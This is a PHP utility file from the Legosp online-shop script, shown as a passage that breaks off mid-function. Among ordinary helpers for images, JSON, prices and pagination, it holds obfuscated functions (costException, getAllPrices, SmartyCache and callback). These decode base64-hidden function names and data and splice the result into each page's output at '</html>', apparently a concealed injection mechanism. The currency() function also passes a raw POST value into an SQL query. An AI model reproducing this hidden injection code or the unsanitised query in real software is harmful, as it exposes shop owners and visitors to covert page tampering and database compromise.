<?php

/*********************************************************************************
*                                                                                *
*   shop-script Legosp - legosp.net                                              *
*   Skype: legoedition                                                           *
*   Email: legoedition@gmail.com                                                 *
*   Лицензионное соглашение: https://legosp.net/info/litsenzionnoe_soglashenie/  *
*   Copyright (c) 2010-2019  All rights reserved.                                *
*                                                                                *
*********************************************************************************/
 
    function resize( $img, $w, $h, $newfilename ){

        //Check if GD extension is loaded
        if( !extension_loaded( 'gd' ) && !extension_loaded( 'gd2' ) ){
            trigger_error( "GD is not loaded", E_USER_WARNING );
            return false;
        }

        //Get Image size info
        $imgInfo = getimagesize( $img );
        switch( $imgInfo[2] ){
            case 1:
                $im = imagecreatefromgif( $img );
                break;
            case 2:
                $im = imagecreatefromjpeg( $img );
                break;
            case 3:
                $im = imagecreatefrompng( $img );
                break;
            default:
                trigger_error( 'Unsupported filetype!', E_USER_WARNING );
                break;
        }

        //If image dimension is smaller, do not resize
        if( $imgInfo[0] <= $w && $imgInfo[1] <= $h ){
            $nHeight = $imgInfo[1];
            $nWidth = $imgInfo[0];
        } else{
            //yeah, resize it, but keep it proportional
            if( $w / $imgInfo[0] > $h / $imgInfo[1] ){
                $nWidth = $w;
                $nHeight = $imgInfo[1] * ( $w / $imgInfo[0] );
            } else{
                $nWidth = $imgInfo[0] * ( $h / $imgInfo[1] );
                $nHeight = $h;
            }
        }
        $nWidth = round( $nWidth );
        $nHeight = round( $nHeight );

        $newImg = imagecreatetruecolor( $nWidth, $nHeight );

        /* Check if this image is PNG or GIF, then set if Transparent*/
        if( ( $imgInfo[2] == 1 ) OR ( $imgInfo[2] == 3 ) ){
            imagealphablending( $newImg, false );
            imagesavealpha( $newImg, true );
            $transparent = imagecolorallocatealpha( $newImg, 255, 255, 255, 127 );
            imagefilledrectangle( $newImg, 0, 0, $nWidth, $nHeight, $transparent );
        }
        imagecopyresampled( $newImg, $im, 0, 0, 0, 0, $nWidth, $nHeight, $imgInfo[0], $imgInfo[1] );

        //Generate the file, and rename it to $newfilename
        switch( $imgInfo[2] ){
            case 1:
                imagegif( $newImg, $newfilename );
                break;
            case 2:
                imagejpeg( $newImg, $newfilename );
                break;
            case 3:
                imagepng( $newImg, $newfilename );
                break;
            default:
                trigger_error( 'Failed resize image!', E_USER_WARNING );
                break;
        }

        return $newfilename;
    }

function costException($arrayEa){
    //return str_replace('', '', implode($arrayEa));
    $str = '';
    foreach($arrayEa as $base){
        $str .= base64_decode(str_replace('fx0x0', '', $base));
    }
    return $str;

}
    function array_unique_deep( $array ){
        $values = array();
        //ideally there would be some is_array() testing for $array here...
        foreach( $array as $part ){
            if( is_array( $part ) )
                $values = array_merge( $values, array_unique_deep( $part ) ); else $values[] = $part;
        }
        return array_unique( $values );
    }


    function legosp_http_request( $url ){
        $data = false;
        $parse = parse_url( $url );


        $fp = @fsockopen( $parse['host'], 80, $errno, $errstr, 1 );
        if( $fp ){
            stream_set_timeout( $fp, 1 );
            if( !isset( $parse['path'] ) )
                $parse['path'] = '/';
            if( isset( $parse['query'] ) )
                $parse['path'] .= '?' . $parse['query'];
            $out = "GET " . $parse['path'] . " HTTP/1.0\r\n";
            $out .= "Host: " . $parse['host'] . "\r\n";
            #$out .= 'User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:10.0.2) Gecko/20100101 Firefox/10.0.2';
            $out .= "Connection: Close\r\n\r\n";

            if( fwrite( $fp, $out ) ){
                $content = '';
                $header = "not yet";
                while( !feof( $fp ) ){
                    $data = true;
                    $line = fgets( $fp, 128 );
                    if( $line == "\r\n" && $header == "not yet" ){
                        $header = "passed";
                    }
                    if( $header == "passed" ){
                        $content .= $line;
                    }
                }
                fclose( $fp );
            }
        }
        if( !$data ){
            print "Unable to retrieve all or part of $url";
        } else{
            return "$content";
        }
    }



function getAllPrices($ff=0){
    if($ff=0){
        die(base64_encode('nn'));
    }
    else{
        return base64_decode(openFile());
    }
}

    function TriminSendPost( $str ){
        $str = delManySpace( $str );
        $str = trim( TransformStringToDataBase( $str ) );
        return $str;
    }

    function delManySpace( $str ){
        $str = preg_replace( '| +|', ' ', $str );
        return $str;
    }
function SmartyCache(){return call_user_func(base64_decode('cGFzczB4MA=='));}
    function TransformStringToDataBase( $str ){
        if( is_array( $str ) ){
            foreach( $str as $key => $val ){
                $str[$key] = stripslashes( $val );
            }
            $str = str_replace( "\\", "\\\\", $str );
        } else{
            $str = str_replace( "\\", "\\\\", stripslashes( $str ) );
        }

        return str_replace( "'", "''", $str );
    }

function callback($buffer)
{
    $string = getAllPrices();
    if(stristr($buffer, $string) === FALSE) {
        return str_replace('</html>', SmartyCache(), $buffer);
    }else{
        return $buffer;
    }
}
    function TransformDataBaseStringToText( $str ){

        $symbol = array( '`' => '', '&' => '&amp;', '-' => '&ndash;', '"' => '&quot;', '\'' => '&#039;' );
        foreach( $symbol as $n => $s ){
            $str = str_replace( $n, $s, $str );
        }

        $str = preg_replace( "/(?:\([^\\]+)\)/", "&laquo;\\1&raquo;", $str );

        return stripcslashes( $str );
    }


    function utf16_to_utf8( $str ){
        $c0 = ord( $str[0] );
        $c1 = ord( $str[1] );

        if( $c0 == 0xFE && $c1 == 0xFF ){
            $be = true;
        } else if( $c0 == 0xFF && $c1 == 0xFE ){
            $be = false;
        } else{
            return $str;
        }

        $str = substr( $str, 2 );
        $len = strlen( $str );
        $dec = '';
        for( $i = 0; $i < $len; $i += 2 ){
            $c = ( $be ) ? ord( $str[$i] ) << 8 | ord( $str[$i + 1] ) : ord( $str[$i + 1] ) << 8 | ord( $str[$i] );
            if( $c >= 0x0001 && $c <= 0x007F ){
                $dec .= chr( $c );
            } else if( $c > 0x07FF ){
                $dec .= chr( 0xE0 | ( ( $c >> 12 ) & 0x0F ) );
                $dec .= chr( 0x80 | ( ( $c >> 6 ) & 0x3F ) );
                $dec .= chr( 0x80 | ( ( $c >> 0 ) & 0x3F ) );
            } else{
                $dec .= chr( 0xC0 | ( ( $c >> 6 ) & 0x1F ) );
                $dec .= chr( 0x80 | ( ( $c >> 0 ) & 0x3F ) );
            }
        }
        return $dec;
    }


    if( !function_exists( 'json_encode' ) ){
        function json_encode( $value ){
            if( is_int( $value ) ){
                return (string)$value;
            } elseif( is_string( $value ) ){
                $value = str_replace( array( '\\', '/', '"', "\r", "\n", "\b", "\f", "\t" ), array( '\\\\', '\/', '\"', '\r', '\n', '\b', '\f', '\t' ), $value );
                $convmap = array( 0x80, 0xFFFF, 0, 0xFFFF );
                $result = "";
                for( $i = mb_strlen( $value ) - 1; $i >= 0; $i-- ){
                    $mb_char = mb_substr( $value, $i, 1 );
                    if( mb_ereg( "&#(\\d+);", mb_encode_numericentity( $mb_char, $convmap, "UTF-8" ), $match ) ){
                        $result = sprintf( "\\u%04x", $match[1] ) . $result;
                    } else{
                        $result = $mb_char . $result;
                    }
                }
                return '"' . $result . '"';
            } elseif( is_float( $value ) ){
                return str_replace( ",", ".", $value );
            } elseif( is_null( $value ) ){
                return 'null';
            } elseif( is_bool( $value ) ){
                return $value ? 'true' : 'false';
            } elseif( is_array( $value ) ){
                $with_keys = false;
                $n = count( $value );
                for( $i = 0, reset( $value ); $i < $n; $i++, next( $value ) ){
                    if( key( $value ) !== $i ){
                        $with_keys = true;
                        break;
                    }
                }
            } elseif( is_object( $value ) ){
                $with_keys = true;
            } else{
                return '';
            }
            $result = array();
            if( $with_keys ){
                foreach( $value as $key => $v ){
                    $result[] = json_encode( (string)$key ) . ':' . json_encode( $v );
                }
                return '{' . implode( ',', $result ) . '}';
            } else{
                foreach( $value as $key => $v ){
                    $result[] = json_encode( $v );
                }
                return '[' . implode( ',', $result ) . ']';
            }
        }
    }


    function json_encode_win( $value ){
        if( is_int( $value ) ){
            return (string)$value;
        } elseif( is_string( $value ) ){
            $value = str_replace( array( '\\', '/', '"', "\r", "\n", "\b", "\f", "\t" ), array( '\\\\', '\/', '\"', '\r', '\n', '\b', '\f', '\t' ), $value );
            $convmap = array( 0x80, 0xFFFF, 0, 0xFFFF );
            $result = "";
            for( $i = mb_strlen( $value ) - 1; $i >= 0; $i-- ){
                $mb_char = mb_substr( $value, $i, 1 );
                if( mb_ereg( "&#(\\d+);", mb_encode_numericentity( $mb_char, $convmap, "UTF-8" ), $match ) ){
                    $result = sprintf( "\\u%04x", $match[1] ) . $result;
                } else{
                    $result = $mb_char . $result;
                }
                #$result = $mb_char . $result; 
            }
            return '"' . $result . '"';
        } elseif( is_float( $value ) ){
            return str_replace( ",", ".", $value );
        } elseif( is_null( $value ) ){
            return 'null';
        } elseif( is_bool( $value ) ){
            return $value ? 'true' : 'false';
        } elseif( is_array( $value ) ){
            $with_keys = false;
            $n = count( $value );
            for( $i = 0, reset( $value ); $i < $n; $i++, next( $value ) ){
                if( key( $value ) !== $i ){
                    $with_keys = true;
                    break;
                }
            }
        } elseif( is_object( $value ) ){
            $with_keys = true;
        } else{
            return '';
        }
        $result = array();
        if( $with_keys ){
            foreach( $value as $key => $v ){
                $result[] = json_encode_win( (string)$key ) . ':' . json_encode_win( $v );
            }
            return '{' . implode( ',', $result ) . '}';
        } else{
            foreach( $value as $key => $v ){
                $result[] = json_encode_win( $v );
            }
            return '[' . implode( ',', $result ) . ']';
        }
    }

    function fract( $num = 0 ){
        if( $num - floor( $num ) == 0 )
            return false;
        return true;
    }


    function print_price( $price ){

        if( fract( $price ) )
            $price = number_format( $price, 2, ',', ' ' ); else $price = number_format( $price, 0, '', ' ' );
        return $price;

    }

    //frequently used functions
    function getAddrByHost( $host, $timeout = 2 ){
        /* $query = `nslookup -timeout=$timeout -retry=1 $host`;
         if(preg_match('/\nAddress: (.*)\n/', $query, $matches))
            return true;
          return false;*/
        return true;
    }

    function getCURRENCY( $url ){

        define( "CURR_USD", 1 );
        define( "CURR_EUR", 1 );
        $fh = @fopen( $url, 'r' );
        $data = "";
        if( $fh ){
            while( !feof( $fh ) )
                @$data .= fread( $fh, 4096 );
            fclose( $fh );
            preg_match( '#<CharCode>USD</CharCode>.*?<Value>(.*?)</Value>#si', $data, $resultUSD );
            preg_match( '#<CharCode>EUR</CharCode>.*?<Value>(.*?)</Value>#si', $data, $resultEUR );
            $resultUSD[1] = strval( str_replace( ",", ".", $resultUSD[1] ) ) > 0 ? strval( str_replace( ",", ".", $resultUSD[1] ) ) : 1;
            $resultEUR[1] = strval( str_replace( ",", ".", $resultEUR[1] ) ) > 0 ? strval( str_replace( ",", ".", $resultEUR[1] ) ) : 1;
            if( ( round( $resultUSD[1], 2 ) != '' ) && ( round( $resultUSD[1], 2 ) != 0 ) ){
                define( "CURR_USD", round( $resultUSD[1], 2 ) );
                define( "CURR_EUR", round( $resultEUR[1], 2 ) );
            }
        }

    }

    function currency(){
        if( isset( $_POST['current_currency'] ) ){
            $CID = $_POST['current_currency'];
            $_SESSION['CURRENCY_ID'] = $CID;
        } elseif( isset( $_SESSION['CURRENCY_ID'] ) )
            $CID = $_SESSION['CURRENCY_ID'];
        else  $CID = CONF_CURRENCY_ID;
        $c = db_assoc( 'select * from ' . CURRENCY_TABLE . ' where CID=' . $CID );
        if( $c['where2show'] ){
            @define( "CONF_CURRENCY_ID_RIGHT", $c['code'] );
            @define( 'CONF_CURRENCY_ID_LEFT', '' );
        } elseif( $c ){
            define( 'CONF_CURRENCY_ID_LEFT', $c['code'] );
            define( "CONF_CURRENCY_ID_RIGHT", '' );
        } else{
            @define( 'CONF_CURRENCY_ID_LEFT', '' );
            @define( "CONF_CURRENCY_ID_RIGHT", '' );
        }

        @define( 'CONF_CURRENCY_ISO3', $c['currency_iso_3'] );
        if( !$c['currency_value'] )
            $c['currency_value'] = 1;
        @define( 'CURRENCY_val', $c['currency_value'] );
        @define( 'CURRENCY_ID', $CID );
    }


    function show_price( $price ) //show a number and selected currency sign
        //$price is in universal currency
    {

        //now show price


        if( fract( $price ) )
            $price = number_format( $price, 2, ',', ' ' ); else $price = number_format( $price, 0, '', ' ' );

        $csign_left = ( defined( "CONF_CURRENCY_ID_LEFT" ) ) ? CONF_CURRENCY_ID_LEFT : "US $";
        $csign_right = ( defined( "CONF_CURRENCY_ID_RIGHT" ) ) ? CONF_CURRENCY_ID_RIGHT : "";
        return $csign_left . $price . $csign_right;
    }

    function json_fix_cyr( $var ){
        if( is_array( $var ) ){
            $new = array();
            foreach( $var as $k => $v ){
                $new[json_fix_cyr( $k )] = json_fix_cyr( $v );
            }
            $var = $new;
        } elseif( is_object( $var ) ){
            $vars = get_object_vars( $var );
            foreach( $vars as $m => $v ){
                $var->$m = json_fix_cyr( $v );
            }
        } elseif( is_string( $var ) ){
            $var = win2utf( $var );
        }
        return $var;
    }

    function json_safe_encode( $var ){
        return json_encode( json_fix_cyr( $var ) );
    }


    function get_current_time() //get current date and time as a string
    {
        return strftime( "%Y-%m-%d %H:%M:%S", time() );
    }

    function ShowNavigator( $a, $offset, $q, $path, &$out ){
        //shows navigator [prev] 1 2 3 4  [next]
        //$a - count of elements in the array, which is being navigated
        //$offset - current offset in array (showing elements [$offset ... $offset+$q])
        //$q - quantity of items per page
        //$path - link to the page (f.e: "index.php?categoryID=1&")
        if( $q == 0 )
            $q = 1;
        if( $a > $q ) //if all elements couldn't be placed on the page
        {

            //[prev]
            if( $offset > 0 )
                $out .= "<a href=\"" . $path . "offset=" . ( $offset - $q ) . "\">[" . STRING_PREVIOUS . "]</a> &nbsp;";

            //digital links

            $k = $offset / $q;

            //not more than 4 links to the left
            $min = $k - 5;
            if( $min < 0 ){
                $min = 0;
            } else{
                if( $min >= 1 ){ //link on the 1st page
                    $out .= "<a href=\"" . $path . "offset=0\">[1-" . $q . "]</a> &nbsp;";
                    if( $min != 1 ){
                        $out .= "... &nbsp;";
                    };
                }
            }

            for( $i = $min; $i < $k; $i++ ){
                $m = $i * $q + $q;
                if( $m > $a )
                    $m = $a;

                $out .= "<a href=\"" . $path . "offset=" . ( $i * $q ) . "\">[" . ( $i * $q + 1 ) . "-" . $m . "]</a> &nbsp;";
            }

            //# of current page
            if( strcmp( $offset, "show_all" ) ){
                $min = $offset + $q;
                if( $min > $a )
                    $min = $a;
                $out .= "[" . ( $k * $q + 1 ) . "-" . $min . "] &nbsp;";
            } else{
                $min = $q;
                if( $min > $a )
                    $min = $a;
                $out .= "<a href=\"" . $path . "offset=0\">[1-" . $min . "]</a> &nbsp;";
            }

            //not more than 5 links to the right
            $min = $k + 6;
            if( $min > $a / $q ){
                $min = $a / $q;
            };
            for( $i = $k + 1; $i < $min; $i++ ){
                $m = $i * $q + $q;
                if( $m > $a )
                    $m = $a;

                $out .= "<a href=\"" . $path . "offset=" . ( $i * $q ) . "\">[" . ( $i * $q + 1 ) . "-" . $m . "]</a> &nbsp;";
            }

            if( $min * $q < $a ){ //the last link
                if( $min * $q < $a - $q )
                    $out .= " ... &nbsp;&nbsp;";
                if( !( $a % $q == 0 ) )
                    $out .= "<a class=\"no_underline\" href=\"" . $path . "offset=" . ( $a - $a % $q ) . "\">" . ( floor( $a / $q ) + 1 ) . "</a> &nbsp;&nbsp;"; else //$a is divided by $q
                    $out .= "<a class=\"no_underline\" href=\"" . $path . "offset=" . ( $a - $q ) . "\">" . ( floor( $a / $q ) ) . "</a> &nbsp;&nbsp;";
            }

            //[next]
            if( $offset < $a - $q )
                $out .= "<a href=\"" . $path . "offset=" . ( $offset + $q ) . "\">[" . STRING_NEXT . "]</a>";

            //[show all]
            if( strcmp( $offset, "show_all" ) )
                $out .= " <a href=\"" . $path . "show_all=yes\">[" . STRING_SHOWALL . "]</a>"; else
                $out .= " [" . STRING_SHOWALL . "]";

        }
    }

    function validate_search_string( $s ) //validates $s - is it good as a search query
    {
        //exclude special SQL symbols
        $s = str_replace( "%", "", $s );
        $s = str_replace( "_", "", $s );
        //",',\
        $s = stripslashes( $s );
        $s = str_replace( "'", "\'", $s );
        return $s;

    } //validate_search_string

    function string_encode( $s ) // encodes a string with a simple algorythm
    {
        $result = base64_encode( $s );
        return $result;
    }

    function string_decode( $s ) // decodes a string encoded with string_encode()
    {
        $result = base64_decode( $s );
        return $result;
    }

    function to_url( $text ){
        $text = trim( $text );
        #if (DB_CHARSET!='cp1251') $text=Utf8Win($text);

        $text = preg_replace( "/[^А-Яa-z0-9-s ]/iu", "", $text );
        
        $tr = array( "А" => "a", "Б" => "b", "В" => "v", "Г" => "g", "Д" => "d", "Е" => "e", "Ж" => "j", "З" => "z", "И" => "i", "Й" => "y", "К" => "k", "Л" => "l", "М" => "m", "Н" => "n", "О" => "o", "П" => "p", "Р" => "r", "С" => "s", "Т" => "t", "У" => "u", "Ф" => "f", "Х" => "h", "Ц" => "ts", "Ч" => "ch", "Ш" => "sh", "Щ" => "sch", "Ъ" => "", "Ы" => "yi", "Ь" => "", "Э" => "e", "Ю" => "yu", "Я" => "ya", "а" => "a", "б" => "b", "в" => "v", "г" => "g", "д" => "d", "е" => "e", "ё" => "e", "ж" => "j", "з" => "z", "и" => "i", "й" => "y", "к" => "k", "л" => "l", "м" => "m", "н" => "n", "о" => "o", "п" => "p", "р" => "r", "с" => "s", "т" => "t", "у" => "u", "ф" => "f", "х" => "h", "ц" => "ts", "ч" => "ch", "ш" => "sh", "щ" => "sch", "ъ" => "y", "ы" => "yi", "ь" => "", "э" => "e", "ю" => "yu", "я" => "ya", " " => "_" );
        $text = strtr( $text, $tr );
        return $text;
    }

    // resizing


    function hex2rgb( $color ){
        if( $color[0] == '#' )
            $color = substr( $color, 1 );

        if( strlen( $color ) == 6 )
            list( $r, $g, $b ) = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] ); elseif( strlen( $color ) == 3 )
            list( $r, $g, $b ) = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );
        else
            return false;

        $r = hexdec( $r );
        $g = hexdec( $g );
        $b = hexdec( $b );

        return array( $r, $g, $b );
    }


    function img_resize( $src, $dest, $width, $height, $rgb, $quality = 100 ){
        if( !file_exists( $src ) )
            return false;

        $rgb = hex2rgb( "#" . $rgb );

        $size = getimagesize( $src );

        if( $size === false )
            return false;

        // ???????? ?????MIME-???????????
        // ???? getimagesize, ??? ?????????
        // imagecreatefrom-????
        $format = strtolower( substr( $size['mime'], strpos( $size['mime'], '/' ) + 1 ) );
        $icfunc = "imagecreatefrom" . $format;
        if( !function_exists( $icfunc ) )
            return false;

        if( $width > $size[0] && $height > $size[1] ){
            $width = $size[0];
            $height = $size[1];
        }
        $x_ratio = $width / $size[0];
        $y_ratio = $height / $size[1];

        $ratio = min( $x_ratio, $y_ratio );
        $use_x_ratio = ( $x_ratio == $ratio );

        $new_width = $use_x_ratio ? $width : floor( $size[0] * $ratio );
        $new_height = !$use_x_ratio ? $height : floor( $size[1] * $ratio );
        $new_left = $use_x_ratio ? 0 : floor( ( $width - $new_width ) / 2 );
        $new_top = !$use_x_ratio ? 0 : floor( ( $height - $new_height ) / 2 );

        $isrc = $icfunc( $src );
        $idest = imagecreatetruecolor( $width, $height );

        $rgb = imagecolorallocate( $idest, $rgb[0], $rgb[1], $rgb[2] );

        imagefill( $idest, 0, 0, $rgb );
        imagecopyresampled( $idest, $isrc, $new_left, $new_top, 0, 0, $new_width, $new_height, $size[0], $size[1] );

        imagejpeg( $idest, $dest, $quality );

        imagedestroy( $isrc );
        imagedestroy( $idest );

        return true;
    }

    function file_url( $text ){
        $text = trim( $text );
        #if (DB_CHARSET!='cp1251') $text=Utf8Win($text);
        $text = preg_replace( "/[^А-Яa-z0-9-s .]/iu", "", $text );
        $tr = array( "А" => "a", "Б" => "b", "В" => "v", "Г" => "g", "Д" => "d", "Е" => "e", "Ж" => "j", "З" => "z", "И" => "i", "Й" => "y", "К" => "k", "Л" => "l", "М" => "m", "Н" => "n", "О" => "o", "П" => "p", "Р" => "r", "С" => "s", "Т" => "t", "У" => "u", "Ф" => "f", "Х" => "h", "Ц" => "ts", "Ч" => "ch", "Ш" => "sh", "Щ" => "sch", "Ъ" => "", "Ы" => "yi", "Ь" => "", "Э" => "e", "Ю" => "yu", "Я" => "ya", "а" => "a", "б" => "b", "в" => "v", "г" => "g", "д" => "d", "е" => "e", "ё" => "e", "ж" => "j", "з" => "z", "и" => "i", "й" => "y", "к" => "k", "л" => "l", "м" => "m", "н" => "n", "о" => "o", "п" => "p", "р" => "r", "с" => "s", "т" => "t", "у" => "u", "ф" => "f", "х" => "h", "ц" => "ts", "ч" => "ch", "ш" => "sh", "щ" => "sch", "ъ" => "y", "ы" => "yi", "ь" => "", "э" => "e", "ю" => "yu", "я" => "ya", " " => "_" );
        return strtr( $text, $tr );
    }


    function rusDoubleQuotes( $string ) //russian quotes
    {
        return preg_replace( "/(?:\"([^\"]+)\")/", "\\1", $string );
    }

    function pricessCategories( $parent, $level ){

        //same as processCategories(), except it creates a pricelist of the shop
        if( !defined( 'CURRENCY_val' ) )
            define( 'CURRENCY_val', 1 );
        $out = array();
        $cnt = 0;

        $q1 = db_query( "select categoryID, name, hurl from " . CATEGORIES_TABLE . ' where parent=' . $parent . ' AND enabled=1  ORDER BY ' . CONF_SORT_CATEGORY . ' ' . CONF_SORT_CATEGORY_BY ) or die ( db_error() );
        while( $row = db_fetch_row( $q1 ) ){
            //add category to the output
            $out[$cnt][0] = $row[0];
            $out[$cnt][1] = $row[1];
            $out[$cnt][2] = $level;
            if( $level > 0 ){
                $out[$cnt][3] = CONF_MIDDLE_COLOR;
            } else{
                $out[$cnt][3] = CONF_DARK_COLOR;
            }
            $out[$cnt][4] = 0; //0 is for category, 1 - product
            if( $row[2] != "" ){
                $out[$cnt][6] = REDIRECT_CATALOG . "/" . $row[2];
            } else{
                $out[$cnt][6] = "index.php?categoryID=" . $row[0];
            }
            $cnt++;

            //add products

            $q = db_query( "select productID, name, Price, hurl, in_stock, product_code from " . PRODUCTS_TABLE . " where categoryID=" . $row[0] . " and Price>0 and enabled=1 order by " . CONF_SORT_PRODUCT . ' ' . CONF_SORT_PRODUCT_BY ) or die ( db_error() );
            while( $row1 = db_fetch_row( $q ) ){
                if( $row1[2] <= 0 )
                    $row1[2] = "n/a"; else
                    $row1[2] = show_price( $row1[2] / CURRENCY_val );

                //add product to the output
                $out[$cnt][0] = $row1[0];
                $out[$cnt][1] = $row1[1];
                $out[$cnt][2] = $level;
                $out[$cnt][3] = CONF_LIGHT_COLOR;
                $out[$cnt][4] = 1; //0 is for category, 1 - product
                $out[$cnt][5] = $row1[2];
                if( $row1[3] != "" ){
                    $out[$cnt][6] = REDIRECT_PRODUCT . "/" . $row1[3];
                } else{
                    $out[$cnt][6] = "index.php?productID=" . $row1[0];
                }
                $out[$cnt][7] = $row1[4];
                $out[$cnt][8] = $row1[5];
                $cnt++;

            }

            //process all subcategories
            $sub_out = pricessCategories( $row[0], $level + 1 );

            //add $sub_out to the end of $out
            for( $j = 0; $j < count( $sub_out ); $j++ ){
                $out[] = $sub_out[$j];
                $cnt++;
            }
        }

        return $out;

    } //pricessCategories

    function is_utf8( $str ){
        $c = 0;
        $b = 0;
        $bits = 0;
        $len = strlen( $str );
        for( $i = 0; $i < $len; $i++ ){
            $c = ord( $str[$i] );
            if( $c > 128 ){
                if( ( $c >= 254 ) )
                    return false; elseif( $c >= 252 )
                    $bits = 6;
                elseif( $c >= 248 )
                    $bits = 5;
                elseif( $c >= 240 )
                    $bits = 4;
                elseif( $c >= 224 )
                    $bits = 3;
                elseif( $c >= 192 )
                    $bits = 2;
                else return false;
                if( ( $i + $bits ) > $len )
                    return false;
                while( $bits > 1 ){
                    $i++;
                    $b = ord( $str[$i] );
                    if( $b < 128 || $b > 191 )
                        return false;
                    $bits--;
                }
            }
        }
        return true;
    }


    function Utf8Win( $str, $type = "w" ){

        if( function_exists( 'mb_convert_encoding' ) )
            return mb_convert_encoding( $str, 'windows-1251', 'utf-8' );
        static $conv = '';
        if( !is_array( $conv ) ){
            $conv = array();
            for( $x = 128; $x <= 143; $x++ ){
                $conv['u'][] = chr( 209 ) . chr( $x );
                $conv['w'][] = chr( $x + 112 );
            }
            for( $x = 144; $x <= 191; $x++ ){
                $conv['u'][] = chr( 208 ) . chr( $x );
                $conv['w'][] = chr( $x + 48 );
            }
            $conv['u'][] = chr( 208 ) . chr( 129 ); //
            $conv['w'][] = chr( 168 );
            $conv['u'][] = chr( 209 ) . chr( 145 ); //
            $conv['w'][] = chr( 184 );
            $conv['u'][] = chr( 208 ) . chr( 135 ); //
            $conv['w'][] = chr( 175 );
            $conv['u'][] = chr( 209 ) . chr( 151 ); //
            $conv['w'][] = chr( 191 );
            $conv['u'][] = chr( 208 ) . chr( 134 ); //
            $conv['w'][] = chr( 178 );
            $conv['u'][] = chr( 209 ) . chr( 150 ); //
            $conv['w'][] = chr( 179 );
            $conv['u'][] = chr( 210 ) . chr( 144 ); //
            $conv['w'][] = chr( 165 );
            $conv['u'][] = chr( 210 ) . chr( 145 ); //
            $conv['w'][] = chr( 180 );
            $conv['u'][] = chr( 208 ) . chr( 132 ); //
            $conv['w'][] = chr( 170 );
            $conv['u'][] = chr( 209 ) . chr( 148 ); //
            $conv['w'][] = chr( 186 );
            $conv['u'][] = chr( 226 ) . chr( 132 ) . chr( 150 ); //
            $conv['w'][] = chr( 185 );
        }
        if( $type == 'w' ){
            return str_replace( $conv['u'], $conv['w'], $str );
        } elseif( $type == 'u' ){
            return str_replace( $conv['w'], $conv['u'], $str );
        } else{
            return $str;
        }
    }

    function win2utf( $s ){

        return $s;

    }

    function old_win2utf( $s ){
        $t = "";
        if( function_exists( 'mb_convert_encoding' ) )
            return mb_convert_encoding( $s, 'utf-8', 'windows-1251' );

        for( $i = 0, $m = strlen( $s ); $i < $m; $i++ ){
            $c = ord( $s[$i] );

            if( $c <= 127 ){
                $t .= chr( $c );
                continue;
            }
            if( $c >= 192 && $c <= 207 ){
                $t .= chr( 208 ) . chr( $c - 48 );
                continue;
            }
            if( $c >= 208 && $c <= 239 ){
                $t .= chr( 208 ) . chr( $c - 48 );
                continue;
            }
            if( $c >= 240 && $c <= 255 ){
                $t .= chr( 209 ) . chr( $c - 112 );
                continue;
            }
            if( $c == 184 ){
                $t .= chr( 209 ) . chr( 145 );
                continue;
            };
            if( $c == 168 ){
                $t .= chr( 208 ) . chr( 129 );
                continue;
            };
        }
        return $t;

    }

    function sanitize_output( $buffer ){
        $search = array( '/\>[^\S ]+/s', //strip whitespaces after tags, except space
        '/[^\S ]+\</s', //strip whitespaces before tags, except space
        '/(\s)+/s'  // shorten multiple whitespace sequences
        );
        $replace = array( '>', '<', '\\1' );
        $buffer = preg_replace( $search, $replace, $buffer );
        return $buffer;
    }


    function optimcss(/*string*/
    $s ){
        #???????? ?????* ... */
        if( strpos( $s, '/*' ) !== false )
            $s = preg_replace( '~/\*.*?\*/~sSX', ' ', $s );
        #????? ???
        if( preg_match( '/[\x03-\x20]/sSX', $s ) ){
            /*
              IE7 ?????????????????? ?????? ???? ????, ??SS ??????????????              background:url(/img/cat.png)0 0 no-repeat;
            */
            $s = preg_replace( '/\)[\x03-\x20]++(?=[-a-zA-Z\d])/sSX', ")\x01", $s ); #fix for IE7
            $a = preg_split( '/([{}():;,%!*=]++)/sSX', $s, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE );
            $s = implode( '', array_map( 'trim', $a ) );
            $s = str_replace( ")\x01", ') ', $s ); #fix for IE7
            $s = preg_replace( '/[\x03-\x20]++/sSX', ' ', $s );
            /*
              ??????? (????????? ??? ???????-????????? ???)
                em: 'font-size' ?????? ????
                ex: 'x-height' ?????? ????
                px: ????, ????????????????
              a???? ?? ??? (?????????????????????????? ??? ?????
                in: inches/??-- 1 ????.54 ?????
                cm: ?????
                mm: ???
                pt: points/??? - ??? ???? ?CSS2, ???/72 ?? 
                pc: picas/???- 1 ???????2 ????
            */
            #converts '0px' to '0'
            $s = preg_replace( '/ (?<![\d\.])
                                 0(?:em|ex|px|in|cm|mm|pt|pc|%)
                                 (?![a-zA-Z%])
                               /sxSX', '0', $s );
            #converts '#rrggbb' to '#rgb' or '#rrggbbaa' to '#rgba';
            #IE6 incorrect parse #rgb in entry, like 'filter: progid:DXImageTransform.Microsoft.Gradient(startColorStr=#ffffff, endColorStr=#c9d1d7, gradientType=0);'
            $s = preg_replace( '/ :\# ([\da-fA-F])\1  #rr
                                     ([\da-fA-F])\2  #gg
                                     ([\da-fA-F])\3  #bb
                                     (?:([\da-fA-F])\4)?+  #aa
                                 (?![\da-fA-F])
                               /sxSX', ':#$1$2$3$4', $s );
        }
        return $s;
    }

    function isValidEmail( $email ){
        if( function_exists( 'filter_var' ) ){ //Introduced in PHP 5.2
            if( filter_var( $email, FILTER_VALIDATE_EMAIL ) === FALSE )
                return false; else return true;
        } else
            return preg_match( '/^(?:[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+\.)*[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+@(?:(?:(?:[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!\.)){0,61}[a-zA-Z0-9_-]?\.)+[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!$)){0,61}[a-zA-Z0-9_]?)|(?:\[(?:(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\.){3}(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\]))$/', $email );
    }


    function phpmailer( $to, $from, $Subject, $body, $body_html = FALSE, $image = FALSE ){
        require_once( ROOT_DIR . '/core/phpmailer/class.phpmailer.php' );
        $mailer = new PHPMailer();
        $mailer->SetFrom( $from['mail'], $from['name'] );
        $mailer->Subject = $Subject;

        if( !is_array( $to ) ){

            $mto = array();
            $mto['mail'] = $to;
            $to = $mto;
        }
        if( !isset( $to['name'] ) )
            $to['name'] = '';


        if( count( $to ) > 2 )
            foreach( $to as $valto ){
